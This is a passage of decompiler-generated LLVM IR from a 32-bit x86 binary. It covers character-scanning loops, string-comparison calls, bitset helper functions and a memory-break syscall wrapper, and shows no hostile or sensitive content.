  %v1_8050da3 = add i32 %v0_8050da365, 1
  store i32 %v1_8050da3, i32* @ebx, align 4
  %v1_8050da4 = inttoptr i32 %v1_8050da3 to i8*
  %v2_8050da4 = load i8, i8* %v1_8050da4, align 1
  %v3_8050da4 = zext i8 %v2_8050da4 to i32
  %v5_8050da4 = and i32 %v6_8050da467, -256
  %v6_8050da4 = or i32 %v3_8050da4, %v5_8050da4
  %v4_8050da6 = icmp eq i8 %v2_8050da4, 0
  br i1 %v4_8050da6, label %dec_label_pc_8050dc3.preheader, label %dec_label_pc_8050daa

dec_label_pc_8050daa:                             ; preds = %dec_label_pc_8050daa.lr.ph, %dec_label_pc_8050da3
  %v6_8050da467 = phi i32 [ %v6_8050da462, %dec_label_pc_8050daa.lr.ph ], [ %v6_8050da4, %dec_label_pc_8050da3 ]
  %v2_8050da466 = phi i8 [ %v2_8050da459, %dec_label_pc_8050daa.lr.ph ], [ %v2_8050da4, %dec_label_pc_8050da3 ]
  %v0_8050da365 = phi i32 [ %v0_8050da4.pre, %dec_label_pc_8050daa.lr.ph ], [ %v1_8050da3, %dec_label_pc_8050da3 ]
  store i32 %v0_8050daa.pre, i32* @eax, align 4
  %v2_8050daf = sext i8 %v2_8050da466 to i32
  store i32 %v2_8050daf, i32* @edx, align 4
  %v2_8050db2 = mul nsw i32 %v2_8050daf, 2
  %v3_8050db2 = add i32 %v0_8050daa.pre, %v2_8050db2
  %v4_8050db2 = inttoptr i32 %v3_8050db2 to i8*
  %v5_8050db2 = load i8, i8* %v4_8050db2, align 1
  %v6_8050db2 = and i8 %v5_8050db2, 32
  %v7_8050db2 = icmp eq i8 %v6_8050db2, 0
  %v1_8050db6 = icmp eq i1 %v7_8050db2, false
  br i1 %v1_8050db6, label %dec_label_pc_8050dc3.preheader, label %dec_label_pc_8050db8

dec_label_pc_8050db8:                             ; preds = %dec_label_pc_8050daa
  %v10_8050db8 = icmp eq i8 %v2_8050da466, 10
  %v1_8050dbb = icmp eq i1 %v10_8050db8, false
  br i1 %v1_8050dbb, label %dec_label_pc_8050da3, label %dec_label_pc_8050dc3.preheader

dec_label_pc_8050dc3.preheader:                   ; preds = %dec_label_pc_8050db8, %dec_label_pc_8050daa, %dec_label_pc_8050da3, %dec_label_pc_8050d96
  %v0_8050da3.lcssa = phi i32 [ %v0_8050da4.pre, %dec_label_pc_8050d96 ], [ %v1_8050da3, %dec_label_pc_8050da3 ], [ %v0_8050da365, %dec_label_pc_8050daa ], [ %v0_8050da365, %dec_label_pc_8050db8 ]
  %v6_8050da4.lcssa = phi i32 [ %v6_8050da462, %dec_label_pc_8050d96 ], [ %v6_8050da4, %dec_label_pc_8050da3 ], [ %v6_8050da467, %dec_label_pc_8050daa ], [ %v6_8050da467, %dec_label_pc_8050db8 ]
  %v1_8050dc373 = inttoptr i32 %v0_8050da3.lcssa to i8*
  %v2_8050dc374 = load i8, i8* %v1_8050dc373, align 1
  %v3_8050dc375 = zext i8 %v2_8050dc374 to i32
  %v5_8050dc376 = and i32 %v6_8050da4.lcssa, -256
  %v6_8050dc377 = or i32 %v3_8050dc375, %v5_8050dc376
  store i32 %v6_8050dc377, i32* @ecx, align 4
  %v4_8050dc578 = icmp eq i8 %v2_8050dc374, 0
  br i1 %v4_8050dc578, label %dec_label_pc_8050ddc, label %dec_label_pc_8050dc9

dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050dd7, %dec_label_pc_8050dc9
  store i8 0, i8* %v1_8050dc381, align 1
  %v0_8050dc2 = load i32, i32* @ebx, align 4
  %v1_8050dc2 = add i32 %v0_8050dc2, 1
  store i32 %v1_8050dc2, i32* @ebx, align 4
  %v4_8050dc3.pre = load i32, i32* @ecx, align 4
  %v1_8050dc3 = inttoptr i32 %v1_8050dc2 to i8*
  %v2_8050dc3 = load i8, i8* %v1_8050dc3, align 1
  %v3_8050dc3 = zext i8 %v2_8050dc3 to i32
  %v5_8050dc3 = and i32 %v4_8050dc3.pre, -256
  %v6_8050dc3 = or i32 %v3_8050dc3, %v5_8050dc3
  store i32 %v6_8050dc3, i32* @ecx, align 4
  %v4_8050dc5 = icmp eq i8 %v2_8050dc3, 0
  br i1 %v4_8050dc5, label %dec_label_pc_8050ddc, label %dec_label_pc_8050dc9

dec_label_pc_8050dc9:                             ; preds = %dec_label_pc_8050dc3.preheader, %dec_label_pc_8050dbf
  %v2_8050dc382 = phi i8 [ %v2_8050dc3, %dec_label_pc_8050dbf ], [ %v2_8050dc374, %dec_label_pc_8050dc3.preheader ]
  %v1_8050dc381 = phi i8* [ %v1_8050dc3, %dec_label_pc_8050dbf ], [ %v1_8050dc373, %dec_label_pc_8050dc3.preheader ]
  %v0_8050de080 = phi i32 [ %v1_8050dc2, %dec_label_pc_8050dbf ], [ %v0_8050da3.lcssa, %dec_label_pc_8050dc3.preheader ]
  %v0_8050dc9 = load i32, i32* @global_var_8055da0, align 32
  store i32 %v0_8050dc9, i32* @eax, align 4
  %v2_8050dce = sext i8 %v2_8050dc382 to i32
  store i32 %v2_8050dce, i32* @edx, align 4
  %v2_8050dd1 = mul nsw i32 %v2_8050dce, 2
  %v3_8050dd1 = add i32 %v0_8050dc9, %v2_8050dd1
  %v4_8050dd1 = inttoptr i32 %v3_8050dd1 to i8*
  %v5_8050dd1 = load i8, i8* %v4_8050dd1, align 1
  %v6_8050dd1 = and i8 %v5_8050dd1, 32
  %v7_8050dd1 = icmp eq i8 %v6_8050dd1, 0
  %v1_8050dd5 = icmp eq i1 %v7_8050dd1, false
  br i1 %v1_8050dd5, label %dec_label_pc_8050dbf, label %dec_label_pc_8050dd7

dec_label_pc_8050dd7:                             ; preds = %dec_label_pc_8050dc9
  %v10_8050dd7 = icmp eq i8 %v2_8050dc382, 10
  br i1 %v10_8050dd7, label %dec_label_pc_8050dbf, label %dec_label_pc_8050ddc

dec_label_pc_8050ddc:                             ; preds = %dec_label_pc_8050dbf, %dec_label_pc_8050dd7, %dec_label_pc_8050dc3.preheader
  %v0_8050de0.lcssa = phi i32 [ %v0_8050da3.lcssa, %dec_label_pc_8050dc3.preheader ], [ %v0_8050de080, %dec_label_pc_8050dd7 ], [ %v1_8050dc2, %dec_label_pc_8050dbf ]
  %v1_8050dc3.lcssa = phi i8* [ %v1_8050dc373, %dec_label_pc_8050dc3.preheader ], [ %v1_8050dc381, %dec_label_pc_8050dd7 ], [ %v1_8050dc3, %dec_label_pc_8050dbf ]
  %v4_8050ddc = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8050de0 = load i8, i8* %v1_8050dc3.lcssa, align 1
  %v3_8050de0 = icmp eq i8 %v2_8050de0, 0
  br i1 %v3_8050de0, label %dec_label_pc_8050dec, label %dec_label_pc_8050de5

dec_label_pc_8050de5:                             ; preds = %dec_label_pc_8050de0.preheader, %dec_label_pc_8050ddc
  %v0_8050d9a = phi i32 [ %v0_8050de0.lcssa, %dec_label_pc_8050ddc ], [ %v0_8050d6254, %dec_label_pc_8050de0.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8050ddc, %dec_label_pc_8050ddc ], [ 0, %dec_label_pc_8050de0.preheader ]
  %v7_8050dea = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_8050dea, label %dec_label_pc_8050dec, label %dec_label_pc_8050d96

dec_label_pc_8050dec:                             ; preds = %dec_label_pc_8050ddc, %dec_label_pc_8050de5, %dec_label_pc_8050de0.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8050de0.preheader ], [ %v4_8050ddc, %dec_label_pc_8050ddc ], [ %stack_var_-196.011, %dec_label_pc_8050de5 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8050df3 = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80549a7.202 to i32), i32* %stack_var_-216, align 4
  %v5_8050e00 = call i32 @function_8051364(i8* %v4_8050e00, i32 ptrtoint ([11 x i8]* @global_var_80549a7.202 to i32), i32 %v0_8050df3, i32 %v0_8050df3)
  store i32 %v5_8050e00, i32* @eax, align 4
  %v1_8050e08 = icmp eq i32 %v5_8050e00, 0
  br i1 %v1_8050e08, label %dec_label_pc_8050e30.preheader, label %dec_label_pc_8050e41

dec_label_pc_8050e30.preheader:                   ; preds = %dec_label_pc_8050dec
  %v0_8050e3087 = load i32, i32* @esi, align 4
  %v5_8050e3492 = icmp slt i32 %v0_8050e3087, %stack_var_-196.0.lcssa
  br i1 %v5_8050e3492, label %dec_label_pc_8050e36.lr.ph, label %dec_label_pc_8050e41

dec_label_pc_8050e36.lr.ph:                       ; preds = %dec_label_pc_8050e30.preheader
  %v0_8050e36.pre = load i32, i32* @global_var_8058a94.137, align 4
  br label %dec_label_pc_8050e36

dec_label_pc_8050e0e:                             ; preds = %dec_label_pc_8050e36
  %v2_8050e11 = mul i32 %v0_8050e3093, 4
  %v4_8050e11 = add i32 %v2_8050e11, %v3_8050e11
  %v5_8050e11 = inttoptr i32 %v4_8050e11 to i32*
  %v6_8050e11 = load i32, i32* %v5_8050e11, align 4
  %v1_8050e18 = add i32 %v0_8050e3093, 1
  store i32 %v1_8050e18, i32* @esi, align 4
  %v1_8050e19 = call i32 @function_804d384(i32 %v6_8050e11)
  %v1_8050e21 = load i32, i32* @ebx, align 4
  %v2_8050e21 = mul i32 %v1_8050e21, 4
  %v3_8050e21 = add i32 %v2_8050e21, 134580872
  %v4_8050e21 = inttoptr i32 %v3_8050e21 to i32*
  store i32 %v1_8050e19, i32* %v4_8050e21, align 4
  %v0_8050e28 = load i32, i32* @ebx, align 4
  %v1_8050e28 = add i32 %v0_8050e28, 1
  store i32 %v1_8050e28, i32* @eax, align 4
  store i32 %v1_8050e28, i32* @global_var_8058a94.137, align 4
  %v0_8050e30 = load i32, i32* @esi, align 4
  %v5_8050e34 = icmp slt i32 %v0_8050e30, %stack_var_-196.0.lcssa
  br i1 %v5_8050e34, label %dec_label_pc_8050e36, label %dec_label_pc_8050e41

dec_label_pc_8050e36:                             ; preds = %dec_label_pc_8050e36.lr.ph, %dec_label_pc_8050e0e
  %v0_8050e36 = phi i32 [ %v0_8050e36.pre, %dec_label_pc_8050e36.lr.ph ], [ %v1_8050e28, %dec_label_pc_8050e0e ]
  %v0_8050e3093 = phi i32 [ %v0_8050e3087, %dec_label_pc_8050e36.lr.ph ], [ %v0_8050e30, %dec_label_pc_8050e0e ]
  store i32 %v0_8050e36, i32* @ebx, align 4
  %v7_8050e3f = icmp sgt i32 %v0_8050e36, 2
  br i1 %v7_8050e3f, label %dec_label_pc_8050e41, label %dec_label_pc_8050e0e

dec_label_pc_8050e41:                             ; preds = %dec_label_pc_8050e30.preheader, %dec_label_pc_8050e0e, %dec_label_pc_8050e36, %dec_label_pc_8050dec
  %v0_8050e41 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80549b2.203 to i32), i32* %stack_var_-216, align 4
  %v0_8050e48 = load i32, i32* @edi, align 4
  %v4_8050e49 = inttoptr i32 %v0_8050e48 to i8*
  %v5_8050e49 = call i32 @function_8051364(i8* %v4_8050e49, i32 ptrtoint ([7 x i8]* @global_var_80549b2.203 to i32), i32 %v0_8050e41, i32 %v0_8050e41)
  store i32 %v5_8050e49, i32* @eax, align 4
  %v1_8050e51 = icmp eq i32 %v5_8050e49, 0
  br i1 %v1_8050e51, label %dec_label_pc_8050e93.preheader, label %dec_label_pc_8050e55

dec_label_pc_8050e55:                             ; preds = %dec_label_pc_8050e41
  %v0_8050e55 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80549b9.204 to i32), i32* %stack_var_-216, align 4
  %v0_8050e5c = load i32, i32* @edi, align 4
  %v4_8050e5d = inttoptr i32 %v0_8050e5c to i8*
  %v5_8050e5d = call i32 @function_8051364(i8* %v4_8050e5d, i32 ptrtoint ([7 x i8]* @global_var_80549b9.204 to i32), i32 %v0_8050e55, i32 %v0_8050e55)
  %v1_8050e65 = icmp eq i32 %v5_8050e5d, 0
  br i1 %v1_8050e65, label %dec_label_pc_8050e93.preheader, label %dec_label_pc_8050ed6

dec_label_pc_8050e93.preheader:                   ; preds = %dec_label_pc_8050e41, %dec_label_pc_8050e55
  %v0_8050e9394 = load i32, i32* @global_var_8058a98.197, align 8
  %tmp4197 = icmp slt i32 %v0_8050e9394, 1
  %tmp4298 = icmp eq i1 %tmp4197, false
  br i1 %tmp4298, label %dec_label_pc_8050e6b, label %dec_label_pc_8050e9c

dec_label_pc_8050e6b:                             ; preds = %dec_label_pc_8050e93.preheader, %dec_label_pc_8050e6b.dec_label_pc_8050e6b_crit_edge
  %v0_8050e9399 = phi i32 [ %v0_8050e93, %dec_label_pc_8050e6b.dec_label_pc_8050e6b_crit_edge ], [ %v0_8050e9394, %dec_label_pc_8050e93.preheader ]
  %v1_8050e6b = add i32 %v0_8050e9399, -1
  %v1_8050e6f = mul i32 %v1_8050e6b, 4
  %v2_8050e6f = add i32 %v1_8050e6f, 134580856
  %v3_8050e6f = inttoptr i32 %v2_8050e6f to i32*
  %v4_8050e6f = load i32, i32* %v3_8050e6f, align 4
  store i32 %v1_8050e6b, i32* @global_var_8058a98.197, align 8
  %v1_8050e7b = call i32 @function_804e481(i32 %v4_8050e6f)
  %v0_8050e80 = load i32, i32* @global_var_8058a98.197, align 8
  %v1_8050e88 = mul i32 %v0_8050e80, 4
  %v2_8050e88 = add i32 %v1_8050e88, ptrtoint (i32* @global_var_8058a78.205 to i32)
  %v3_8050e88 = inttoptr i32 %v2_8050e88 to i32*
  store i32 0, i32* %v3_8050e88, align 4
  %v0_8050e93 = load i32, i32* @global_var_8058a98.197, align 8
  %tmp41 = icmp slt i32 %v0_8050e93, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8050e6b.dec_label_pc_8050e6b_crit_edge, label %dec_label_pc_8050e9c

dec_label_pc_8050e6b.dec_label_pc_8050e6b_crit_edge: ; preds = %dec_label_pc_8050e6b
  br label %dec_label_pc_8050e6b

dec_label_pc_8050e9c:                             ; preds = %dec_label_pc_8050e6b, %dec_label_pc_8050e93.preheader
  %v0_8050e93.lcssa = phi i32 [ %v0_8050e9394, %dec_label_pc_8050e93.preheader ], [ %v0_8050e93, %dec_label_pc_8050e6b ]
  store i32 1, i32* @esi, align 4
  %v5_8050ec9105 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8050ec9105, label %dec_label_pc_8050ecb, label %dec_label_pc_8050ed6

dec_label_pc_8050ea3:                             ; preds = %dec_label_pc_8050ecb
  %v2_8050ea6 = mul i32 %v0_8050ead107, 4
  %v4_8050ea6 = add i32 %v2_8050ea6, %v3_8050e11
  %v5_8050ea6 = inttoptr i32 %v4_8050ea6 to i32*
  %v6_8050ea6 = load i32, i32* %v5_8050ea6, align 4
  %v1_8050ead = add i32 %v0_8050ead107, 1
  store i32 %v1_8050ead, i32* @esi, align 4
  %v1_8050eae = call i32 @function_804d384(i32 %v6_8050ea6)
  %v1_8050eb6 = load i32, i32* @ebx, align 4
  %v2_8050eb6 = mul i32 %v1_8050eb6, 4
  %v3_8050eb6 = add i32 %v2_8050eb6, 134580856
  %v4_8050eb6 = inttoptr i32 %v3_8050eb6 to i32*
  store i32 %v1_8050eae, i32* %v4_8050eb6, align 4
  %v0_8050ebd = load i32, i32* @ebx, align 4
  %v1_8050ebd = add i32 %v0_8050ebd, 1
  store i32 %v1_8050ebd, i32* @global_var_8058a98.197, align 8
  %v0_8050ec5.pre = load i32, i32* @esi, align 4
  %v5_8050ec9 = icmp slt i32 %v0_8050ec5.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8050ec9, label %dec_label_pc_8050ecb, label %dec_label_pc_8050ed6

dec_label_pc_8050ecb:                             ; preds = %dec_label_pc_8050e9c, %dec_label_pc_8050ea3
  %v0_8050ead107 = phi i32 [ %v0_8050ec5.pre, %dec_label_pc_8050ea3 ], [ 1, %dec_label_pc_8050e9c ]
  %v0_8050ecb106 = phi i32 [ %v1_8050ebd, %dec_label_pc_8050ea3 ], [ %v0_8050e93.lcssa, %dec_label_pc_8050e9c ]
  store i32 %v0_8050ecb106, i32* @ebx, align 4
  %v7_8050ed4 = icmp sgt i32 %v0_8050ecb106, 3
  br i1 %v7_8050ed4, label %dec_label_pc_8050ed6, label %dec_label_pc_8050ea3

dec_label_pc_8050ed6:                             ; preds = %dec_label_pc_8050d63.preheader, %dec_label_pc_8050d62, %dec_label_pc_8050e9c, %dec_label_pc_8050ecb, %dec_label_pc_8050ea3, %dec_label_pc_8050e55, %dec_label_pc_8050d84, %dec_label_pc_8050d7b, %dec_label_pc_8050ed6.preheader
  %v0_8050ed6 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8050edd, i32* @ebx, align 4
  %v3_8050ee2 = call i32 @function_804cca8(i32 %v2_8050edd, i32 128, i32 %v0_8050ed6)
  store i32 %v3_8050ee2, i32* @eax, align 4
  %v1_8050eea = icmp eq i32 %v3_8050ee2, 0
  %v1_8050eec = icmp eq i1 %v1_8050eea, false
  br i1 %v1_8050eec, label %dec_label_pc_8050d63.preheader, label %dec_label_pc_8050ef2

dec_label_pc_8050d63.preheader:                   ; preds = %dec_label_pc_8050ed6
  %v0_8050d63.pre = load i32, i32* @ebx, align 4
  %v4_8050d63.pre = load i32, i32* @ecx, align 4
  %v1_8050d6347 = inttoptr i32 %v0_8050d63.pre to i8*
  %v2_8050d6348 = load i8, i8* %v1_8050d6347, align 1
  %v3_8050d6349 = zext i8 %v2_8050d6348 to i32
  %v5_8050d6350 = and i32 %v4_8050d63.pre, -256
  %v6_8050d6351 = or i32 %v3_8050d6349, %v5_8050d6350
  store i32 %v6_8050d6351, i32* @ecx, align 4
  %v4_8050d6552 = icmp eq i8 %v2_8050d6348, 0
  br i1 %v4_8050d6552, label %dec_label_pc_8050ed6, label %dec_label_pc_8050d6d.lr.ph

dec_label_pc_8050d6d.lr.ph:                       ; preds = %dec_label_pc_8050d63.preheader
  %v0_8050d6d.pre = load i32, i32* @global_var_8055da0, align 32
  br label %dec_label_pc_8050d6d

dec_label_pc_8050ef2:                             ; preds = %dec_label_pc_8050ed6
  %v0_8050ef5 = load i32, i32* @ebp, align 4
  %v1_8050ef6 = inttoptr i32 %v0_8050ef5 to i16*
  %v2_8050ef6 = call i32 @function_804b7fc(i16* %v1_8050ef6)
  br label %dec_label_pc_8050f0b

dec_label_pc_8050f00:                             ; preds = %dec_label_pc_8050d3f
  %v0_8050f00 = call i32 @function_804f828()
  %v1_8050f05 = inttoptr i32 %v0_8050f00 to i32*
  store i32 3, i32* %v1_8050f05, align 4
  br label %dec_label_pc_8050f0b

dec_label_pc_8050f0b:                             ; preds = %dec_label_pc_8050ce4, %dec_label_pc_8050ef2, %dec_label_pc_8050f00
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8050cf8, i32* @eax, align 4
  %v2_8050f17 = call i32 @function_804f016(i32 %v2_8050cf8, i32 1)
  store i32 %v0_8050ce4, i32* @ebp, align 4
  ret i32 %v2_8050f17

; uselistorder directives
  uselistorder i32 %v0_8050d6d.pre, { 1, 0 }
  uselistorder i32 %v6_8050d6351, { 1, 0 }
  uselistorder i8 %v2_8050d6348, { 1, 2, 0 }
  uselistorder i8* %v1_8050d6347, { 1, 0 }
  uselistorder i32 %v0_8050d63.pre, { 1, 0 }
  uselistorder i32 %v0_8050e93, { 0, 2, 1 }
  uselistorder i32 %v0_8050e36, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8050dce, { 1, 0 }
  uselistorder i32 %v2_8050daf, { 1, 0 }
  uselistorder i32 %v1_8050da3, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050d72, { 1, 0 }
  uselistorder i32 %v1_8050d62, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_804f828, { 5, 4, 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_804e481, { 17, 16, 15, 4, 3, 2, 1, 0, 6, 14, 13, 12, 11, 10, 9, 8, 19, 18, 7, 21, 20, 5 }
  uselistorder i32* @global_var_8058a98.197, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 13, 11, 8, 9, 10 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8058a94.137, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8055db0.136 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8050f0b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050ed6, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8050ecb, { 1, 0 }
  uselistorder label %dec_label_pc_8050e6b, { 1, 0 }
  uselistorder label %dec_label_pc_8050e93.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050e41, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8050e36, { 1, 0 }
  uselistorder label %dec_label_pc_8050dec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050de5, { 1, 0 }
  uselistorder label %dec_label_pc_8050ddc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050dc9, { 1, 0 }
  uselistorder label %dec_label_pc_8050daa, { 1, 0 }
  uselistorder label %dec_label_pc_8050ed6.preheader, { 1, 0 }
}

define i32 @function_8050f28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8050f28:
  %v9_8050f4b = inttoptr i32 %arg3 to i32*
  %v10_8050f4b = call i32 @function_8051c79(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8050f4b, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8050f4b
}

define i32 @function_8050f54() local_unnamed_addr {
dec_label_pc_8050f54:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050f77 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050f7e = call i32 @function_804f368(i32 9, i32 %v2_8050f77)
  ret i32 %v2_8050f7e

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804f368, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_8050f88(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050f88:
  %v0_8050f8b = call i32 @function_804b64c()
  %v2_8050f97 = call i32 @function_804b6dc(i32 %v0_8050f8b, i32 %arg1)
  ret i32 %v2_8050f97
}

define i32 @function_8050fa0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050fa0:
  %v1_8050fae = add i32 %arg2, -1
  %v1_8050fb1 = urem i32 %v1_8050fae, 32
  %v2_8050fb1 = icmp eq i32 %v1_8050fb1, 0
  %v2_8050fb4 = udiv i32 %v1_8050fae, 32
  br i1 %v2_8050fb1, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050fa0
  %v5_8050fb7 = shl i32 1, %v1_8050fb1
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050fa0, %bb
  %v6_8050fb9 = phi i32 [ 1, %dec_label_pc_8050fa0 ], [ %v5_8050fb7, %bb ]
  %v2_8050fb9 = mul nuw nsw i32 %v2_8050fb4, 4
  %v3_8050fb9 = add i32 %v2_8050fb9, %arg1
  %v4_8050fb9 = inttoptr i32 %v3_8050fb9 to i32*
  %v5_8050fb9 = load i32, i32* %v4_8050fb9, align 4
  %v7_8050fb9 = and i32 %v5_8050fb9, %v6_8050fb9
  %v8_8050fb9 = icmp eq i32 %v7_8050fb9, 0
  %v1_8050fbd = icmp eq i1 %v8_8050fb9, false
  %v2_8050fbd = zext i1 %v1_8050fbd to i32
  ret i32 %v2_8050fbd

; uselistorder directives
  uselistorder i32 %v1_8050fb1, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050fc4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050fc4:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050fc4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fc4, i32* %stack_var_-4, align 4
  %v1_8050fd2 = add i32 %arg2, -1
  %v1_8050fd5 = urem i32 %v1_8050fd2, 32
  %v2_8050fd5 = icmp eq i32 %v1_8050fd5, 0
  store i32 %v1_8050fd5, i32* @ecx, align 4
  br i1 %v2_8050fd5, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8050fc4
  %v5_8050fd8 = shl i32 1, %v1_8050fd5
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8050fc4, %bb
  %v6_8050fdd = phi i32 [ 1, %dec_label_pc_8050fc4 ], [ %v5_8050fd8, %bb ]
  %v2_8050fda = udiv i32 %v1_8050fd2, 32
  store i32 %v2_8050fda, i32* @edx, align 4
  %v2_8050fdd = mul nuw nsw i32 %v2_8050fda, 4
  %v3_8050fdd = add i32 %v2_8050fdd, %arg1
  %v4_8050fdd = inttoptr i32 %v3_8050fdd to i32*
  %v5_8050fdd = load i32, i32* %v4_8050fdd, align 4
  %v7_8050fdd = or i32 %v5_8050fdd, %v6_8050fdd
  store i32 %v7_8050fdd, i32* %v4_8050fdd, align 4
  %v2_8050fe2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050fe2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050fda, { 1, 0 }
  uselistorder i32 %v1_8050fd5, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8050fe4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050fe4:
  %v1_8050ff2 = add i32 %arg2, -1
  %v1_8050ff5 = urem i32 %v1_8050ff2, 32
  %v2_8050ff5 = icmp eq i32 %v1_8050ff5, 0
  br i1 %v2_8050ff5, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_8050fe4
  %v4_8050ff8 = shl i32 -2, %v1_8050ff5
  %v5_8050ff8 = sub nsw i32 32, %v1_8050ff5
  %v6_8050ff8 = lshr i32 -2, %v5_8050ff8
  %v7_8050ff8 = or i32 %v6_8050ff8, %v4_8050ff8
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_8050fe4, %bb
  %v6_8050ffd = phi i32 [ -2, %dec_label_pc_8050fe4 ], [ %v7_8050ff8, %bb ]
  %v2_8050ffa = udiv i32 %v1_8050ff2, 32
  %v2_8050ffd = mul nuw nsw i32 %v2_8050ffa, 4
  %v3_8050ffd = add i32 %v2_8050ffd, %arg1
  %v4_8050ffd = inttoptr i32 %v3_8050ffd to i32*
  %v5_8050ffd = load i32, i32* %v4_8050ffd, align 4
  %v7_8050ffd = and i32 %v5_8050ffd, %v6_8050ffd
  store i32 %v7_8050ffd, i32* %v4_8050ffd, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050ff5, { 1, 2, 0 }
  uselistorder i32 -2, { 4, 6, 5, 3, 7, 0, 17, 18, 1, 14, 15, 16, 20, 2, 8, 9, 10, 19, 11, 12, 13 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_8051004() local_unnamed_addr {
dec_label_pc_8051004:
  %v0_8051004 = load i32, i32* @eax, align 4
  %v1_8051004 = add i32 %v0_8051004, 28
  %v2_8051004 = inttoptr i32 %v1_8051004 to i32*
  %v3_8051004 = load i32, i32* %v2_8051004, align 4
  store i32 %v3_8051004, i32* @global_var_8058a9c.206, align 4
  %v1_805100d = add i32 %v0_8051004, 44
  %v2_805100d = inttoptr i32 %v1_805100d to i32*
  %v3_805100d = load i32, i32* %v2_805100d, align 4
  store i32 %v3_805100d, i32* @global_var_8058aa0.207, align 32
  ret i32 %v3_805100d
}

define i32 @function_8051018(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051018:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051018 = load i32, i32* @ebx, align 4
  store i32 %v0_8051018, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805102b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805102b, i32* @global_var_80584a4.184, align 4
  %v7_8051036 = icmp ult i32 %v1_805102b, %arg1
  %v1_8051038 = icmp eq i1 %v7_8051036, false
  br i1 %v1_8051038, label %dec_label_pc_8051048, label %dec_label_pc_805103a

dec_label_pc_805103a:                             ; preds = %dec_label_pc_8051018
  %v0_805103a = load i32, i32* %stack_var_-4, align 4
  %v1_805103a = call i32 @function_804b7f4(i32 %v0_805103a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8051042 = inttoptr i32 %v1_805103a to i32*
  store i32 12, i32* %v1_8051042, align 4
  %v0_8051049.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051048

dec_label_pc_8051048:                             ; preds = %dec_label_pc_8051018, %dec_label_pc_805103a
  %v0_8051049 = phi i32 [ 0, %dec_label_pc_8051018 ], [ %v0_8051049.pre, %dec_label_pc_805103a ]
  %v2_805104c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805104c, i32* @ebx, align 4
  ret i32 %v0_8051049

; uselistorder directives
  uselistorder i32 %v1_805102b, { 1, 0 }
